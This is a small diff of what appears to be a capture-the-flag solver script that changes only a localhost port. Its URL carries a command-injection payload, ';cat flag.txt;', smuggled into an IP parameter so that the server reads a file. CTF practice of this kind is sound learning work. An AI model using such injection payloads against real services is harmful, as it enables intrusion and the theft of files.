@@ -1,7 +1,7 @@
 import requests
 import re
 
-URL = "http://localhost:5004?IP=::1%;cat flag.txt;"
+URL = "http://localhost:5006?IP=::1%;cat flag.txt;"
 
 pattern = r'sunctf{.*?}'
 
